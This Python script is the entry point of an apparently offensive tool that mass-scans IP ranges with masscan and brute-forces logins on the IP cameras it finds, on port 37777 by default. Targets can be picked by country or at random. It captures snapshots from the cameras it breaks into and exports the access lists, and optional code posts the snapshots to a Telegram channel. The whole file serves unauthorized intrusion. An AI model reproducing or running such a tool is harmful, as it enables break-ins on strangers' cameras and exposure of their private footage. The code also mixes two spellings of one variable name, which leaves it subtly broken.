#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import sys, random, requests
import optparse, platform
import subprocess

from countrycode import countrycode
from pyfiglet import Figlet
from pathlib import Path
from queue import Queue

from geolocation import IPDenyGeolocationToIP
from bot import Poster
from snapshot import *
from export import *
from utils import *
from brute import *
from colorama import init


def get_os_type():
    if platform.system() == "Windows":
        init()
        return 'win'
    else:
        return 'nix'


# TODO: make bruteforce core function
# TODO: rewrite with importlib, python-netsurv, git://dhondta/sploitkit

def process_cameras():
    brute_file = config.tmp_masscan_file
    hosts = masscan_parse(brute_file)
    ip_count = len(hosts)
    logging.info("Parsed %s IPs from Masscan output" % ip_count)

    if not hosts:
        return False

    ips_list_file = config.ips_file % config.start_datetime
    full_ips_list = os.path.join(config.reports_folder, ips_list_file)
    with open(full_ips_list, 'w') as file:
        for host in hosts:
            file.write(host[0] + ":" + host[1] + "\n")
    logging.info('IPs saved to %s' % full_ips_list)



    config.total = len(hosts)

    try:
        brute_queue = Queue()
        screenshot_queue = Queue()
        image_processing_queue = Queue()

        for _ in range(config.default_brute_threads):
            brute_worker = BruteThread(brute_queue, screenshot_queue)
            brute_worker.setDaemon(True)
            brute_worker.start()

        for _ in range(config.default_snap_threads):
            screenshot_worker = ScreenshotThread(screenshot_queue, image_processing_queue)
            screenshot_worker.setDaemon(True)
            screenshot_worker.start()

        for _ in range(config.default_image_threads):
            image_processing_worker = ImageProcessingThread(image_processing_queue)
            image_processing_worker.setDaemon(True)
            image_processing_worker.start()


        for host in hosts:
            brute_queue.put(host, block=False, timeout=25)
        print(f'\nStarting to brute total {str(brute_queue.qsize())} devices\n')

        brute_queue.join()
        screenshot_queue.join()
        image_processing_queue.join()
        # raise exception here
        print('\n')

    except Exception as e:
        logging.error(e)
        logging.info("Brute process interrupt!")
        logging.debug(config.working_hosts)




    logging.info('Results: %s devices found, %s bruted' % (len(hosts), len(config.working_hosts)))
    logging.info('Made total %s snapshots' % (config.snapshots_counts))


def masscan(filescan, threads, resume):
    logging.info('Starting scan with masscan on ports %s' % ", ".join(config.global_ports))
    if resume:
        logging.info('Continue last scan from paused.conf')
        params = ' --resume paused.conf %s' % config.additional_masscan_params()
    else:
        params = ' -p %s -iL %s -oL %s --rate=%s %s' % (
            ",".join(config.global_ports), filescan, config.tmp_masscan_file, threads, config.additional_masscan_params())
        params += ' --http-user-agent="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"'
    mmasscan_path = config.masscan_nix_path if get_os_type() == 'nix' else config.masscan_windows_path
    binary = 'sudo ' + mmascan_path if get_os_type() == 'nix' else mmascan_path

    try:
        if sys.platform.startswith('freebsd') \
                or sys.platform.startswith('linux') \
                or sys.platform.startswith('darwin'):
           p = subprocess.Popen(
                [mmasscan_path, '-V'],
                bufsize=10000,
                stdout=subprocess.PIPE,
                close_fds=True)
        else:
             p = subprocess.Popen(
                  [mmasscan_path, '-V'],
                  bufsize=10000,
                  stdout=subprocess.PIPE)

    except OSError:
           logging.error('Please install Masscan or define \
full path to binary in .config file.')
           sys.exit(0)

    os.system(binary + params)
    if not os.path.exists(config.tmp_masscan_file):
        logging.error('Masscan output error, results file %s not found. Try to run Masscan as Administrator (root)' %
                      config.tmp_masscan_file)
        sys.exit(0)


def get_options():
    parser = optparse.OptionParser('%prog' + " [-s <scan file>] [-b <brute file>] -t <threads>")
    parser.add_option('-s', dest='scan_file', type='string',
                      help='IP ranges list file to scan. Example: 192.168.1.1-192.168.11.1')
    parser.add_option('-b', dest='brute_file', type='string', help='IPs list file to brute, in any format')
    parser.add_option('-m', '--masscan', dest='brute_only', action="store_false", default=True,
                      help='Run Masscan and brute it results')
    parser.add_option('--masscan-resume', dest='masscan_resume', action="store_true", default=False,
                      help='Continue paused Masscan scan')
    parser.add_option('--no-snapshots', dest='snapshots', action="store_false", default=True,
                      help='Do not make snapshots')
    parser.add_option('--no-xml', dest='no_xml', action="store_true", default=False,
                      help='Do not make SMART PSS xml files')
    parser.add_option('-t', dest='threads', default=str(config.default_masscan_threads), type='string',
                      help='Threads number for Masscan. Default %s' % config.default_masscan_threads)
    parser.add_option('--dead', dest='dead_cams', action='store_true', default=False,
                      help='Write not bruted cams to file')
    parser.add_option('-d', dest='debug', action='store_true', default=False, help='Debug output')
    parser.add_option('--country', dest='country', action='store_true', default=False, help='Scan by country')
    parser.add_option('--random-country', dest='random_country', action='store_true', default=False,
                      help='Scan by random country')
    parser.add_option('-l', dest='logins_passes', action='store_true', default=False,
                      help='Brute combinations from %s and %s instead of %s' % (
                      config.logins_file, config.passwords_file, config.logopass_file))
    parser.add_option('-p', '--ports', dest='ports', type='string',
                      help='Ports to scan, 37777 by default. Example: 37777,37778')
    (options, _) = parser.parse_args()

    country = ''
    city = ''
    count = 0

    if options.ports:
        print('\nIt`s better to run with "-d" \
flag while setting custom ports!')
        print('That`s why this forced c;\n\n')
        config.global_ports = options.ports.split(',')

    if options.masscan_resume:
        options.brute_only = False

    if options.random_country:
        options.brute_only = False
        count = 600000
        total_count = 0
        total_range = []

        while config.max_ips < count:
            country = random.choice(countrycode.data['country_name'])
            for stored_c in list(dict.fromkeys(config.random_countries)):
                if country is stored_c:
                   continue
            locator = IPDenyGeolocationToIP(country, city)
            try:
                range_list = locator.get_random_ranges(max_ips=int(count), day_ranges=True)
            except Exception as e:
                logging.debug(e)
                continue
            total_range += range_list
            slash = ['|', '/', ' ', '-']
            print(f'Searching for a bright-day ip-ranges {random.choice(slash)}', end='\r')
            time.sleep(2) # spell from ban
            for cidr in range_list:
                count2 = IPDenyGeolocationToIP.get_cidr_count(cidr)
                total_count += count2
            config.max_ips = total_count
        else:
             logging.info('Generated %s IPs from %s' % (total_count, list(dict.fromkeys(config.random_countries))))
             config.global_country = random.choice(config.random_countries)
             file = open(config.tmp_masscan_file, 'w')
             file.write("\n".join(total_range))
             file.close()
             options.scan_file = config.tmp_masscan_file

    if options.country:
        options.brute_only = False
        country = input('Enter country name (defaut random): ')
        if not country:
            country = random.choice(countrycode.data['country_name'])
            print('Selected %s' % country)
        config.global_country = country
        city = input('Enter city name (default none): ')
        count = input('Maximum IPs (default 1000000): ') or 1000000
        locator = IPDenyGeolocationToIP(country, city)
        range_list = locator.get_random_ranges(max_ips=int(count))
        total_count = 0
        for cidr in range_list:
            count3 = IPDenyGeolocationToIP.get_cidr_count(cidr)
            total_count += count3

        logging.info('Generated %s IPs from %s' % (total_count, config.global_country))

        file = open(config.tmp_masscan_file, 'w')
        file.write("\n".join(range_list))
        file.close()

        options.scan_file = config.tmp_masscan_file

    if not options.brute_file:
        options.brute_file = config.tmp_masscan_file
    else:
        config.custom_brute_file = True
        config.tmp_masscan_file = options.brute_file

    if not os.path.exists(options.brute_file) and options.brute_only:
        logging.error('File with IPs %s not found. Specify it with -b option or run without brute-only option'
                      % config.tmp_masscan_file)
        sys.exit(0)

    if not options.scan_file and not options.brute_only and not options.masscan_resume:
        logging.error("No target file scan list")
        parser.print_help()
        sys.exit(0)

    return options


def main():
    get_os_type()
    f = Figlet(font='slant')
    print(f.renderText('asleep')) #+ '\n')
    print('https://t.me/asleep_cg' + '\n')
    options = get_options()
    if options.debug or options.ports:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().propagate = False
    setup_credentials(not options.logins_passes)
    prepare_folders_and_files()
    if not options.brute_only:
        masscan(options.scan_file, options.threads, options.masscan_resume)
    process_cameras()
    if not options.no_xml and len(config.working_hosts) > 0:
        save_xml(config.working_hosts)
    save_csv()
    if options.dead_cams:
        hosts = masscan_parse(config.tmp_masscan_file)
        dead_cams(hosts)

    # Configs for Telegram Bot:
    ROOM_ID = '' # Channel ID
    TOKEN = '' # Bot Token
    SNAPSHOT_DIR = os.path.join(Path.cwd(), config.snapshots_folder)
    """ delete=True removes snapshots after posting """
    #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False) 
    #poster.start()  ### Start posting function

    if os.path.exists(config.snapshots_folder):
        c_error = False
        if config.global_country:
           try:
               os.rename(config.snapshots_folder, '%s_%s' % (config.global_country, config.start_datetime))
           except:
               c_error = True
        elif not config.global_country or c_error:
             os.rename(config.snapshots_folder, 'Snapshots_%s' % config.start_datetime)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n')
        logging.info('Interrupted by user')
        sys.exit(0)
